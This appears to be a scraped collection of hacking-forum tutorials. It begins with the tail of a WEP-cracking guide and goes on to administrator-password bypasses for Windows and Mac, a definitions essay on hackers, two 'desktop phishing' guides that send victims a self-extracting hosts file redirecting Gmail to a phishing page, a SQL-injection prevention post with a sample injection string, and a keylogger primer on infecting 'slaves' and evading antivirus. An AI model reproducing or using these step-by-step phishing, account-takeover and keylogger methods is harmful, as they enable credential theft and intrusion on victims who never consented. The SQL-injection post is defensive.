been collected to run your crack. Watch the number in the \""#Data\"" column—you want it to go above 10,000. (Pictured below its only at 854.) Depending on the power of your network (mine is inexplicably low at -32 in that screenshot, even though the yoyo AP was in the same room as my adapter), this process could take some time. Wait until that #Data goes over 10k, though—because the crack wont work if it doesnt. In fact, you may need more than 10k, though that seems to be a working threshold for many. Once youve collected enough data, its the moment of truth. Launch a third Konsole window and run the following to crack that data youve collected: aircrack-ng -b (bssid) (file name-01.cap) Here the filename should be whatever you entered above for (file name). You can browse to your Home directory to see it; its the one with .cap as the extension. If you didnt get enough data, aircrack will fail and tell you to try again with more. If it succeeds, it will look like this: The WEP key appears next to \""KEY FOUND.\"" Drop the colons and enter it to log onto the network. Problems Along the Way With this article I set out to prove that cracking WEP is a relatively \""easy\"" process for someone determined and willing to get the hardware and software going. I still think thats true, but unlike the guy in the video below, I had several difficulties along the way. In fact, youll notice that the last screenshot up there doesnt look like the others—its because its not mine. Even though the AP which I was cracking was my own and in the same room as my Alfa, the power reading on the signal was always around -30, and so the data collection was very slow, and BackTrack would consistently crash before it was complete. After about half a dozen attempts (and trying BackTrack on both my Mac and PC, as a live CD and a virtual machine), I still havent captured enough data for aircrack to decrypt the key. So while this process is easy in theory, your mileage may vary depending on your hardware, proximity to the AP point, and the way the planets are aligned. Oh yeah, and if youre on deadline—Murphys Law almost guarantees it wont work if youre on deadline. ------------------------------------------------------------------------------------------------------------------------------------------ To see the video version of these exact instructions, check out this dudes YouTube video.

0	Facebook Tips and tircks	"""   I sometimes start my day off by doing a bunch of stuff on Facebook that I realize if I donÃ¢â¬â¢t share with my readers, how selfish of me! So today I decided to share some of the wonderful tricks and some tips of Facebook that I have discovered. If you have interesting tips/tricks related to Facebook, please feel free to share in the comment box below. 1. See all your friendÃ¢â¬â¢s pictures in a tiles format Login into Facebook and in your facebook sidebar click on the my friends link you will see a drop down box next to show, now hover or rollover your mouse and then click on one of the dashed lines (Ã¢â¬â). You will see a page full of al the profile pictures of all your facebook friends. The profile photos will be shown in a tiled format. It really looks cool try it. 2. Appear Offline To Selected Friends Appear Offline to those who are pestering you. Simply, open FB Chat and click FriendÃ¢â¬â¢s list, then Create a new list with whatever name you want and include all those people you donÃ¢â¬â¢t want to chat with in that list. Now you can appear offline to them by moving the green slider to offline whenever you come online. 3. Facebook Pirate Language This is my favorite Facebook tip and if you are a fan of Ã¢â¬ÅPirate MoviesÃ¢â¬Â it will become yours too. Instead of seeing Ã¢â¬ÅShare with friendsÃ¢â¬Â you can see Ã¢â¬ÅBlabber tÃ¢â¬â¢ yer matesÃ¢â¬Â and other pirate words/phrases. Basically, to make Facebook communicate with you in old Pirate Language, Simple go to your Current Language Settings (located at the bottom of the page) and click the language as English (Pirate). 4. See creatorÃ¢â¬â¢s profile Creator in a facebook community is the first profile created in your community. Generally you canÃ¢â¬â¢t search for his profile. But by using this cool facebook trick you can do it, just follow some simple steps. Goto your profile page and look at your id in the url in the address bar of your web browser. The first few numbers represent your school ID, so if you change the rest of the numbers to zero and the last number to one. It will show you the first person or the first profile created from your school, college or work place. This profile is known as Ã¢â¬ÅCreatorÃ¢â¬â¢sÃ¢â¬Â profile. This trick is not much of use, but just in case. 5. Hide Your Online Status From Selected Friends: So you want to use Facebook chat but donÃ¢â¬â¢t want some people to see your online status? Simply open up the Facebook Chat and click on Friends List. Start creating a new list called BlockList. Once the list is created, add those friends to the list that you want to appear offline to. When the list is complete, hover your mouse to the little green icon adjacent to the list and click Go Offline. Bingo! You will now appear offline to everybody in the BlockList. 6. View a FriendÃ¢â¬â¢s Profile Without Messy Applications: If you are like me, you often get annoyed by the dozens of silly applications that people have added to their profile. HereÃ¢â¬â¢s a Grease Monkey script that allows you to view any profile without all those applications. Remember: the Mozilla Firefox web browser is a prerequisite for running Greasemonkey. 7.

0	Hack admin account in XP, Vista, Windows 7 and Mac - Complete beginners guide!!	"""   1.Hack administrator account in XP OS – Just by using command prompt is one of the easiest ways (without installation of any programs). •Open the computer in safe mode pressing ‘F8’ key (in xp safe mode does not require password unless it is set) •Now open command prompt: Start>Run>cmd •Once you are in command prompt, type in the following command to finally change the administrator password: net user (this command will show you the list of users in your computer) net user Administrator (this command will show you the information of administrator like when was the account created and if it has a password or not) net user Administrator * (this command will prompt a blinker that says “Type a password for the user:” This is the place where you want to enter your password. Now, remember that when you type your password, you won’t be able to see the characters; you will just see the blinker. After you finish typing your password you will see another prompt which says “Retype the password to confirm:” Now type in the same password again and you will see “The command completed successfully.” •Finally, you have changed the administrator password using command prompt. 2.In case the safe mode in XP OS is protected with password  – Using a live CD of a program called Ophcrack. Ophcrack uses rainbow table to crack password in LM and NTLM hashes. Actually, our system stores passwords by converting them in to their hashes which is like a code so that even if someone will find it, it will be tough for them because they need to change the hashes in to real characters and that’s what rainbow table does. Rainbow table has large number of passwords along with their respective hashes. Hence, this is how Ophcrack works. Anyways, if you don’t care then just move on and follow the steps below . •Download Ophcrack XP LiveCD from here:  http://ophcrack.sourceforge.net/download...ype=livecd •After you finish downloading, you need to burn the downloaded file in to cd using .iso burner for which you need to download a program to burn, get it from here: http://www.freeisoburner.com/ •Now once your Ophcrack disc is ready, insert it in to the target computer and restart the computer. Since the Ophcrack is bootable, it will load itself. Now you will see this screen: •After you see the above screen, press enter (which is on ‘Ophcrack Graphic mode-automatic) •Wait until Ophcrack loads up as it tries to find the hashes. •Finally, you will see the Ophcrack screen as below: •Now, just leave it until Ophcrack will list all the users’ passwords including Administrator in ‘NT Pwd’ column. The one with empty does not have a password. It only cracks the passwords up to 14 characters long. 3.In case Ophcrack LiveCd does not work for you  – Using live cd of another program called Trinity Rescue (this is my favorite tool). However, this tool does not recover the password like Ophcrack but it will change any password.  •Download Trinity Rescue Kit from here: http://trinityhome.org/Home/index.php?fr...=12&wpid=5 •Now once you finish downloading you need to burn it in to a cd for which you need to repeat the same thing as we discussed above for Ophcrack. Download iso burner to burn the file in to cd from here: http://www.freeisoburner.com/ •After your Trinity Rescue disc is ready, insert in to the target computer and restart. Again, it will load itself and you will see the screen shown below: •After you see the above screen press enter and leave it until you see the screen below: •Now, once you see the above screen, you will also notice a blinker which is [ [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ ]:(~)# _ This lets you enter commands. Now type in winpass and you will see the screen below: •Now after you see the above screen type 1 and press enter so that it will pullout the information of users in that computer which is very important to see if some other user is admin or not. This will let you figure out which user account should you crack according to your choice. •Now, say you wanna hack admin account. So type in winpass –u Administrator and you will see the same screen as above. So, press 1 and enter again and leave it until you see a numbered list to perform different actions. •After you see this list, select the number according to your choice and press enter. Say you want to clear the admin password, then type 1 and press enter. Now leave it until you see the the blinker with [ [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ ]:(~)# _ Once you see this, type init 0 and it will shutdown Trinity Rescue and restart your computer again. Also, remove Trinity Rescue Disc from your computer. Now, you will see two accounts on your login page. One is the administrator and another is the current user. Now if you click on administrator it will open without asking any password. I would highly recommend beginners to user Trinity Rescue kit as it hits the target for sure. Ophcrack is good but it does not guarantee you that it will crack the password for sure. 4. Hack administrator account in XP OS –  Using Live Cd of Backtrack 4 (its works like trinity rescue as it removes the password of any account) •Download Backtrack 4 from here: http://www.backtrack-linux.org/downloads/ • So after you finish downloading, you need to burn the downloaded file in to cd using .iso burner for which you need to download a program to burn, get it from here: http://www.freeisoburner.com/ •Now, once your Backtrack 4 live cd is ready, insert it in to the target computer and restart. Backtrack 4 will load itself and you will see the screen below: •Now, we will use a program called ‘Chntpw’ from Backtrack 4. You can find by clicking, Backtrack Start menu>Backtrack>Privilege Escalation>Password Attacks>Chntpw, as shown below: •After you open Chntpw, you will get a screen which shows you then information about Chntpw and also a blinker which is  [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ :~# in order to let you enter the command. Now you need to type in a command which is actually giving the location of SAM file (where the password of the system is stored). Location of SAM file varies but usually it is inside the ‘config’ of System 32. Now type in this command: chntpw –i /mnt/hda1/windows/System32/config/SAM •After you finish typing the above command you will see a screen with a numbered list of options and a blinker to let you enter the specific number to perform the action according to your wish as seen below: •Ok, so number 1 lets you edit user date and password so enter 1. Now, you will see the list of users in that computer. Type in Administrator or whichever you want and then enter. You will again see a numbered list with different options. •If you wish to clear user password, then enter 1 or if you wish to perform different action with the account then enter different number. Now, simply restart the computer and login in to any account you want. 5.Hack administrator account in Vista OS  – Using command prompt •The main problem in vista using command prompt to hack admin account is that you have to be logged in as admin and that’s what we trying to do. So, this method for vista is useless. But, the process to change the admin password is same as we did for XP above using the same command. 6.Hack administrator account in Vista OS  – Using Ophcrack  •Its exactly the same process as we did above for XP OS but you should download the live cd for Vista OS as they have two live cd in the link, one is for XP OS and one is for Vista OS. Again, follow the same step number 2 above using the same link and burning the cd and everything. 7.Hack administrator account in Vista OS and Windows 7 OS  – Using Trinity Rescue •Again, it is exactly same for XP, Vista OS and Windows 7 OS. Therefore, follow the step number 3 above and unlike in Ophcrack, you don’t have to make separate live cd of Trinity Rescue for XP, Vista and Windows 7. The same live cd will work for all three. 8.Hack administrator account in Vista OS  – Using Backtrack 4 •Same as in step number 4 downloading same file and following all the same steps. 9.Create an admin account in Mac (without the installation of any programs):  I have shown different methods to change the Administrator password for pc using windows OS, I will also include a brief tutorial on how to be an administrator or how to create an admin account on Mac computers. •First reboot your mac. Then hold the Apple logo + S on startup. After this, you will be directed to root screen with a blinker :/ root# where you can input commands to create an admin account. •Now type in the following command: mount –uw / (remember that there is a space after mount and before slash) rm /var/db/ .Applesetupdone (space after rm and the last slash) reboot •Now when your mac restarts it will ask you to setup everything from the very beginning like your wifi, username and other stuffs. Now, you have all the rights of an administrator. Thank you! I hope this tutorial will help. A TUT by  Xenonflux   """
0	What is hacking? Introduction to Hacking	"""   1.originally, someone who makes furniture with an axe1. A person who enjoys exploring the details of programmable systems and how to stretch their capabilities, as opposed to most users, who prefer to learn only the minimum necessary. 2. One whoprograms enthusiastically (even obsessively) or who enjoys programming rather than just theorizing about programming. 3. Aperson capable of appreciating hack value.  4. A person who is good at programming quickly.  5. An expert at a particular program, or one who frequently does work using it or on it; as in Ã¢â¬Ëa Unix hacker.Ã¢â¬â¢ (Definitions 1 through 5 are correlated, and people who fit them congregate.) 6. An expert or enthusiast of any kind. One might be an astronomy hacker, for example.  7. One who enjoys the intellectual challenge of creatively overcoming or circumventing limitations.  8. [deprecated] A malicious meddler who tries to discover sensitive information by poking around. Hence Ã¢â¬Ëpassword hacker,Ã¢â¬â¢ Ã¢â¬Ënetwork hacker.Ã¢â¬â¢ The correct term for this sense is cracker. Cracker One who breaks security on a system. Coined ca. 1985 by hackers in defense against journalistic misuse of hacker (q.v., sense 8). An earlier attempt to establish Ã¢â¬ËwormÃ¢â¬â¢ in this sense around 1981Ã¢â¬â82 on Usenet was largely a failure. Use of both these neologisms reflects a strong revulsion against the theft and vandalism perpetrated by cracking rings. While it is expected that any real hacker will have done some playful cracking and knows many of the basic techniques, anyone past larval stage is expected to have outgrown the desire to do so except for immediate, benign, practical reasons (for example, if itÃ¢â¬â¢s necessary to get around some security in order to get some work done). Thus, there is far less overlap between hackerdom and crackerdom than the mundane reader misled by sensationalistic journalism might expect. Crackers tend to gather in small, tight-knit, very secretive groups that have little overlap with the huge, open poly-culture this lexicon describes; though crackers often like to describe themselves as hackers, most true hackers consider them a separate and lower form of life. ItÃ¢â¬â¢s clear that the term cracker is absolutely meant to be derogatory. One shouldnÃ¢â¬â¢t take the tone too seriously though, as The Jargon File is done with a sense of humor, and the above is said with a smile. As we can see from the above, illegal or perhaps immoral activity is viewed with disdain by the Ã¢â¬Åtrue hackers,Ã¢â¬Â whomever they may be. It also makes reference to cracker being a possible intermediate step to hacker, perhaps something to be overcome. Script Kiddie The term script kiddie has come into vogue in recent years. The term refers to crackers who use scripts and programs written by others to perform their intrusions. If one is labeled a Ã¢â¬Åscript kiddie,Ã¢â¬Â then he or she is assumed to be incapable of producing his or her own tools and exploits, and lacks proper understanding of exactly how the tools he or she uses work. As will be apparent by the end of this chapter, skill and knowledge (and secondarily, ethics) are the essential ingredients to achieving status in the minds of hackers. By definition, a script kiddie has no skills, no knowledge, and no ethics. Phreak A phreak is a hacker variant, or rather, a specific species of hacker. Phreak is short for phone phreak (freak spelled with a ph, like phone is). Phreaks are hackers with an interest in telephones and telephone systems. Naturally, there has been at times a tremendous amount of overlap between traditional hacker roles and phreaks. White Hat/Black Hat/Gray Hat White Hat Hacker: White Hat hackers are good guys who does the hacking for defensing.  They probably work an organization for providing security. Black Hat Hacker Black hat hackers are bad guys(the malicious hackers or crackers).  They usually steal the other bank information and steal the money.  They use their skills for illegal purposes. They are creators of viruses,malware,spyware. They will destroy your pc. Gray Hat Hackers Grey hats are hackers who may work offensively or defensively, depending on the situation. This is the dividing line between hacker and cracker. Both are powerful forces on the Internet, and both will remain permanently. And some individuals qualify for both categories. The existence of such individuals further clouds the division between these two groups of people. In addition to these groups, there are self-proclaimed ethical hackers, who are interested in hacker tools mostly from a curiosity standpoint. They may want to highlight security problems in a system or educate victims so they secure their systems properly. These hackers are doing their Ã¢â¬ÅvictimsÃ¢â¬Â a favor. For instance, if a weakness is discovered in a service offered by an investment bank, the hacker is doing the bank a favor by giving the bank a chance to rectify the vulnerability.   """
0	Hack Gmail Account Using Original Domain Address for Phishing Web page	""" friends ,  you may have known about how to create phishing web Page.  If you dont know about Phishing Web Page, you need to read this tutorials first: How To Create fake or phishing web page Once you know the basics of Phishing web Page ,come to this post.  Requirements:  Wamp server    Install WinRar Ok friends, theres one drawback in our traditional Phishing web page method. You know what is it? You are right, the url of our phishing web page. It may look like the real one,but it is not. For eg: we may create the Phishing web page with  http://www.gmails.com  but its not at all same as  http://www.gmail.com Probably, the experienced internet users will notice the URL of web Page. So they wont fall in our Fishnet.  What we are going to do now? Why should not we make the phishing web pages URL looks exactly same as the real Domain Name? You may ask \""is it possible?\"". My answer is yes, you can. It sounds good na? go ahead. How we are going to implement? We are going to send an email with an executable to victim. If the victim double click the executable file, then you are done. Now whenever the victim enter the real domain name (like  http://www.facebook.com ) ,he will be in our phishing web page. Dont worry the domain name is original URL(like  http://www.facebook.com ) Got surprised....!!!! You may ask how this is done,go ahead. How it is done?  Executable file will change the Host file of Victim system.   What is host file?      The host file contains Domain Name and IP address associated with them.  Your host file will be in this path: C:\\Windows\\System32\\drivers\\etc\\ Whenever we enter the Domain name or URL (for eg:  http://www.webaddress.com ), a query will be send to the DNS (Domain Name server).  This DNS connect to the IP address which is associated with the Domain Name.   But before this to be done, the host file in our system will check for the IP address associated with the Domain Name.  Suppose we make an entry with Domain Name and IP address of our phishing web page(for  eg:  http://www.webaddress.com  wiht our ip 123.23.X.X),then theres no query will be send to the DNS. It will automatically connect to the IP address associated with the Domain Name.  This will fruitful for us to mask the PHISHING web pages URL with Original Domain Name. Now Lets divide into the Implementation: If you are hosting some other hosting site, probably you wont get the unique IP address for your Phishing Web Page. You can have the IP Address of the hosting only. So if you try to use that IP address, the victim will not bring to your Phishing web page , they will bring to the hosting address.  So what you can do overcome this problem? You need to set up your own Webserver in home. Using Webserver softwares you can set up your own Hosting service.   Your computer should be turned on always. Because if you turned off the computer,then probably host will not be in online. Again it will be available when you turned on. So your computer turned on when victim visits your site. How To set up Your own server? Download the  Webserver softwares like WAMP,XAMP(Both are open source software, I meant they are free ).  My suggestion is WAMP.  Because it is my favorite one.  It is easy to use. Downlad the wamp server from  http://www.wampserver.com/ Install the WAMP server.  After installation completed, Go to this folder path: C:\\Wamp\\WWW And paste your phishing web page here. Start the Wamp Server. (Start->windows->All Programs->Wamp Server->start wamp server) you can see the half circle icon(wamp server icon) in system tray(i mean near to the time). Click the icon and select the start all services. Now type your ip address in address bar of the web browser and hit enter. If you dont know your ip address ,visit  http://www.whatismyip.com . Now you can see your Phishing web page in your Browser. Modifying the Host file :  Copy the Host file from this path \""C:\\WINDOWS\\system32\\drivers\\etc\"" to desktop.  Right click on the host file and open with Notepad. You can see the localhost entry there. Below that type as : your_ip     domain_name For eg: 123.xx.xx.xx  http://www.gmail.com .  Save the File. Compress the Host File:     Compress hosts file such that when victim opens it, it automatically gets copied to default  location C:\\Windows\\system32\\drivers\\etc and victims hosts file get replaced by our modified hosts file.   Right click on the Hosts file and select the Add to archieve option.  Now follow the steps which is shown in picture: Now send the zipped file to victim.  If he extract the zip file, then the hosts file will be replaced. You are done.  Now whenever he try to visit the genuine or original website, the phishing webpage only will be shown. Some Disadvantages of this Hack: If your IP address is dynamically changed ,then it is hard to implement it   If your victim is advanced user,he may notice the certificates of site which is shown by browser. Dont worry it is not at all big problem.   Just try it ane enjoy it. """

0	Desktop phishing	""" Hello !ND!4N H4CK3RS.....!!! This is the tutorial on Desktop Phishing... Lets Start... Desktop Phishing is a new technique of phishing (Advanced). Phishing Vs Desktop Phishing :- In Phishing: 1. Attacker convinces the victim to click on the link of fake login page which resembles a genuine login page. 2. Victim enters his credentials in fake login page that goes to attacker. 3. Victim is then redirected to an error page or genuine website, depending on attacker. But the main drawback in phishing is that victim can easily differentiate between fake and real login page by looking at the domain name. We can overcome this in desktop phishing by spoofing domain name. In Desktop Phishing: 1. Attacker sends an executable file to victim and victim is supposed to double click on it. Attackers job is done. 2. Victim types the domain name of original/genuine website and is taken to our fake login page. But the domain name remains the same as typed by victim and victim doesnt come to know. 3. Rest of the things are same as in normal phishing.  Now lets start... We need to configure hosts file first which is located in C:\\Windows\\System32\\drivers\\etc\\ Whenever we visit any website, say  www.anything.com  , an query is sent to Domain Name Server(DNS) to look up for the IP address associated with that website/domain. But before doing this the hosts file on our local computer is checked for the IP address associated to the domain name. Suppose we make an entry in hosts file as shown. When we visit  www.anywebsite.com  , we would be taken to this 115.125.124.50. No query for resolving IP address associated with  www.anywebsite.com  would be sent to DNS. Hope you got an idea that how modification of this hosts file on victims computer can be misused. We need to modify victims hosts file by adding the genuine domain name and IP address of our fake website /phishing page.Whenever victim would visit the genuine website , he would be directed to our fake login page and domain name in the URL box would remain genuine as typed by victim. Hence domain name is spoofed. Steps to perform attack: 1. Host phishing page on your computer.  Since the webshosting sites like 110mb.com,ripway.com etc where we usually upload our phishing page do not provide a IP that points to your website like  www.anything.110mb.com . An IP address points to a webserver and not a website. So we need to host the phishing page on our computer using a webserver software like wamp or xampp. Download the wamp or xampp.     Copy your phishing page and paste it in the WWW directory in wamp, the default path is \""C:\\Wamp\\WWW\""      Run Wamp server on your pc.     Right click the wamp icon in the system tray and select Start all services, Visit your public IP address and you must see your phishing page. 2. Modify Hosts file. If you dont have physical access to victims computer. Then copy your hosts file and paste anywhere. Edit it with any text editor and associate your public IP address with domain you wish as show. Like in this case , when victim would visit gmail.com , he would be take to website hosted on IP xxx.xxx.xxx.xxx. Replace it with your public IP. 3. Compress hosts file such that when victim opens it, it automatically gets copied to default location C:\\Windows\\system32\\drivers\\etc and victims hosts file get replaced by our modified hosts file. Then you can bind this file with any exe using a binder or directly give it to victim. He/she is supposed to click it and you are done. """
0	preventing SQL injection attacks!! ;)	"""   [COLOR=\""#00FFFF\""]hi gyuzz ... i hope this is yusefull  Preventing SQL injections NOTE : IF YOU DO NOT KNOW PHP NOTHING TO WORRY .. THIS IS  NOOB  FRIENDLY There are usually two types of attacks :     [COLOR=\""#FF0000\""]1. URL based      2. Form based [/COLOR] Major reason for both of them is Ã¢â¬Ëbadly architectured parametresÃ¢â¬â¢ many say That remove/rename or unlink the database configuration file, ofcourse this will work but this is NOT the solution, as it will halt the functionality of the site, your Dynamic website will turn into just html pages in seconds, this is anologus to condition like, because of fear of robbery you donÃ¢â¬â¢t buy anything for yourself too: P what we will be doing is sanitizing and validating php variables, we have make sure That our critical global arrays like get, post, files, session, cookies etc allow data which we Want them to store and nothing else, because we canÃ¢â¬â¢t trust the fact that users will enter expected data. What we mean is suppose you have site script like this: blabla.com/news.php?id=8 Now what dis means is, in our Ã¢â¬Ånews.phpÃ¢â¬Â script (in global GET array) we have an array location $_GET[id] which contains the value which is being passed via URL, In our case it is Ã¢â¬Ë8Ã¢â¬â¢, what usually careless admins do is, pass on the get[] as it is to the database query which is to be executed so that proper content for id=8  Can be extracted from database and thrown on the user screen, SQL query can be like : $news_query = Ã¢â¬ÅSELECT * FROM news WHERE NEWS =Ã¢â¬â¢Ã¢â¬Â.$_GET[Ã¢â¬ËidÃ¢â¬â¢].Ã¢â¬ÂÃ¢â¬â¢Ã¢â¬Â; Now if we manipulate the URL and write Ã¢â¬ËsomethingÃ¢â¬â¢ in place of Ã¢â¬ËexpectedÃ¢â¬â¢ integer then we may break normal query and can execute our own queries! by breaking a query i mean, as in the above example we wrote NEWS =Ã¢â¬â¢$_GET[id]Ã¢â¬â¢ if instead of expected id we write something like ==> 8Ã¢â¬â¢; eval_query; # now what our new url is ==> blabla.com/news.php?id=8Ã¢â¬â¢; eval_query; # our new query becomes ==> $news_query = Ã¢â¬ÅSELECT * FROM news WHERE NEWS =Ã¢â¬â¢8Ã¢â¬â¢; eval_query; #Ã¢â¬â¢; # is used to comment out query part after it, so now as u can see our Ã¢â¬Åeval queryÃ¢â¬Â will be executed with normal expected query, eval query can be { DROP TABLE news} which will drop the Ã¢â¬ÅnewsÃ¢â¬Â! we can prevent this if instead of directly using get[] variable in query we first validate them and then use them, by validating I mean, we make sure that URL variables contains only that data which we want them to store and nothing else (in this case, we want integers for id values), this depend on the programming of the script, we may sometimes want alphabets(lower case or upper case or both), numbers, some special characters etc Ã¢â¬Â¦ php gives us some function to do the same : in this case we can use Ã¢â¬Åpreg_replaceÃ¢â¬Â or maybe Ã¢â¬Ëereg_replaceÃ¢â¬â¢, i advertise preg_replace cause it has lot more functionality and is faster than ereg :) [you can search php.net if you want details about them] so here we want only numbers in id fiels so we wil add this line before querying it : $id = $_GET[Ã¢â¬ËidÃ¢â¬â¢]; $vald_id = preg_replace(Ã¢â¬Ë#[^0-9]#iÃ¢â¬â¢, Ã¢â¬Â, $id); first line is getting id variable from url via get and storing it in local variable $id, next we are cleaning it using preg_replace, so that it only contains numbers from 0-9 (if anything else is there it will replace it with a blank.space) and nothing else, we will use this cleaned variable $vald_id in our query. if we want some(defined) special characters along with alphabets we can write (in place of [^0-9]) : preg_replace(Ã¢â¬Ë#[^A-Za-z,.?$@!]#iÃ¢â¬â¢, Ã¢â¬Â, $id); Now how to patch panels/forms of sites against sql suppose there is an admin panel say blabla.com/admin/ hit [ctrl+u] view source, crawl source and search for [action=], cause every html form will be processin and submitting form elements using php scripts, if its written something like action=Ã¢â¬Â<?php echo $PHP_SELF;?>Ã¢â¬Â ==> this means php script is calling itself and its processing is done in same script if instead there ist written : action=Ã¢â¬Âlogin.phpÃ¢â¬Â [it can also call lol.php dosnÃ¢â¬â¢t matter :P] this means all form data goes to login.php processed there and then sent to database. Main culprit is login.php because it is not filtering variables correcty! go to login.php, it wil be having lines looking like $username = $_POST[Ã¢â¬ËuserÃ¢â¬â¢]; $pass=$_POST[Ã¢â¬ËpassÃ¢â¬â¢]; $loginquery = Ã¢â¬ÅSELECT * FROM tbl_admin WHERE username =Ã¢â¬â¢$usernameÃ¢â¬â¢ AND password = Ã¢â¬Ë$passÃ¢â¬â¢Ã¢â¬Â; $result = mysql_query($loginquery); so we need to clean POST array elements before using them in a query we will use preg_replace as before and we will also use strip_tags as we donÃ¢â¬â¢t want any html javascript elements in our form data, basic syntax is ==> strip_tags($variable) if you want to allow certain tags like <br> then we can also do that as ==> strip_tags($var, Ã¢â¬Ë<br>Ã¢â¬â¢) [/COLOR]  :cool::cool: """
0	A ultimate beginners guide to keyloggers!!	"""   [COLOR=\""#00FFFF\""]Welcome to a Beginners Guide to Keyloggers! In this guide I will go through all the common topics that you may need to know. When you finish reading this topic you will know everything you will ever need to get started keylogging. I cover every topic related to keyloggers as well as cover terminology and definitions. Ill explain how a keylogger works and how to even get started making your own! So lets get started! [/COLOR]   TABLE OF CONTENTS     [COLOR=\""#FFFF00\""]What is a keylogger?     Learning the lingo and definitions.     Common features keyloggers have.     How do I use a keylogger?     What is a \""stub\""?     What is the \""server\""?     What is crypting?     What is the difference between a stealer and a keylogger?     What is .net framework and why do I care?     What are some good keyloggers?     What are some upsides to keyloggers?     What are some downsides to keyloggers?     I want to make my own keylogger. Where do I start?     I think Ive been infected with a keylogger! What do I do?     Conclusion     WHAT IS A KEYLOGGER?[/COLOR]     [COLOR=\""#00FF00\""]A keylogger is a program that logs a keyboards keystrokes. It can be used for several purposes, both black hat and white hat. The most common use is black hat. A keylogger functions by grabbing a keystroke, triggered by when the slave presses a key on their keyboard, and saving it to a variable. This process is called \""keyboard hooking\"". It then will take this long variable and send it via a SMTP or FTP server. You can then view these logs and use it for whatever your intention may be. Keyloggers have several different features that I will go into in a later section. The most basic ones only include keyboard hooking and a way to send the logs.     LEARNING THE LINGO     One of the most confusing things about starting something new is not understanding the lingo. If you dont understand the lingo, how will you know what people are talking about? In this section Ill be explaining the common terms people use concerning keyloggers. Ill be going over some other more general things as well.[/COLOR]     [COLOR=\""#FFFF00\""]Logger     Slang term for keylogger. See the \""What is a keylogger\"" section.     Hooks     Slang term for keyboard hooks. These are also explained in the \""What is a keylogger section\""     Keystrokes     Section of code that is triggered when the slave types something on the keyboard.     Logs     Compiliation of all the keystrokes over a period of time.     FTP     A webhost that stores files that allows the user to connect and retrieve said files. Files in this case are logs.     SMTP     A way that logs are sent via email. Example, MSN, Gmail, Yahoo, etc.[/COLOR]    [COLOR=\""#00FF00\""] FUD     Full Un-Detected. This means that antiviruses will not detect your file as a virus. This will be further explained in the \""What is crypting section\"".     UD     Undetected. This means that some antiviruses will not detect your files as a virus, while others will.     Server     A server is the output of your keylogger. I will take this in-depth in the \""What is a server?\"" section.     Crypter     A crypter crypts your file removing detections. Ill take this in-depth in the \""What is crypting\"" section.     Detection     A detection is a term used when an antivirus detects, or thinks your file is a virus. You always want to have the least amount of detections possible to increase your success rate and to reduce errors.     Black hat     A black hat is someone who uses their knowledge of computers and security for malicious reasons.     White hat     A white hat is someone who uses their knowledge of computers and security for helpful reasons. They help disinfect and improve others security to combat black hat hackers.     Grey hat     A grey hat is a mixture between a black and white hat. They will infect innocent people and then help them get rid of it, for free or a price (the latter being more common).     Backdoored     When a file is backdoored it has a virus binded to it. This means that the file will act normally and the user will be infected without their knowledge. This has become extremely common in the keylogger section. Always be wary of new releases. [/COLOR]     [COLOR=\""#00FF00\""]COMMON FEATURES [/COLOR]     [COLOR=\""#00FF00\""]As Ive said before, most keyloggers have two basic settings. Keyboard hooking and log sending (by FTP or SMTP). Most keylogger developers (myself included) like to include more settings to help ease the user experience. Below is a list of common settings you may find, and what they do: [/COLOR]     [COLOR=\""#FFFF00\""]Icon Changers     This will change your viruses icon without corrupting it like some third party programs can do.     MuteX     MuteX is a unique string that you generate. It helps prevent multiple logs from being sent.     Add to Startup     This will add a registry (or other ways) that will cause your virus to start when the computer is turned on.     Antis     Antis are a feature that help keep your virus on the slaves computer for as long as possible. They disable or stop certain white hat programs such as antiviruses, sandboxie, and keyscramblers from running or removing your file.     Disable CMD/Taskmanager/Registry     This feature will change the registry value for each of these system tools to disable them.     Logging interval     This allows the user to chose how often logs are sent.     Fake Error Message     This will cause a fake error message to pop up, making it seem less suspicious.     File pumper     This will add to the size of your virus. This helps making it seem less suspicious as a game wont be a few kilobytes.     Assembly Editing     This allows you to change things found in the properties menu when right clicking a file. This helps it seem more like a real file rather than a virus.     Encrypted user information     This encrtyps your information so that others cannot steal it by decompiling your virus.     Test connection     This will test your credentials that youve entered to make sure they are correct. [/COLOR]     [COLOR=\""#00FFFF\""]HOW DO I USE IT?     Using a keylogger is a lot easier than it sounds. All you need to do is find one that you want to use, download it, and then chose your settings. Once you have entered all your information and chosen your settings, click the build button. The builder will create your server. This is what you give to people. Give them this file and when they run it they will be infected and you will start receiving logs. Pretty self explanitory. If you ever have a question contact the creator and they should be able to help you. [/COLOR]     [COLOR=\""#FF0000\""]WHAT IS A \""STUB\""     A stub is a separate binary that contains special code that is required for the keylogger to function. There are usually two things in a keylogger. The builder and the stub. Some keyloggers will have a stub built in. A builder takes the information and settings youve chosen and merges it with a stub. The stub contains keyhooks and the workings of each feature. These two merge to create your virus, containing all of the information. Ill cover this file in the next section. [/COLOR]     